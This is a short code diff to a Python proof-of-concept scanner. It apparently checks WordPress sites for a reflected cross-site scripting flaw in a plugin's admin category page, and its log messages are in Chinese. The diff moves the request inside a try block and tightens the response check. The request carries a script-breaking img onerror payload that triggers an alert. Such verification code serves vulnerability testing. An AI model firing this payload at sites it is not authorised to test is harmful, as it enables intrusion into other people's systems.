@@ -31,13 +31,12 @@ class Poc(ABPoc):
         super(Poc, self).__init__(Vuln())
 
     def verify(self):
-        path = '{target}/wp-admin/admin.php?page=el_admin_categories&action=delete_bulk&slug[0]=1&slug[1]=2</script><img+src=1+onerror=alert(123321)>'.format(target=self.target)
         self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
             target=self.target, vuln=self.vuln))
         try:
-            self.output.info('检查{target}是否存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
+            path = '{target}/wp-admin/admin.php?page=el_admin_categories&action=delete_bulk&slug[0]=1&slug[1]=2</script><img+src=1+onerror=alert(123321)>'.format(target=self.target)
             r = requests.get(path)
-            if '123321' in r.text:
+            if 'alert(123321)' in r.text:
                 self.output.report(self.vuln, '目标{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
         except Exception,e:
             self.output.info('执行异常{}'.format(e))
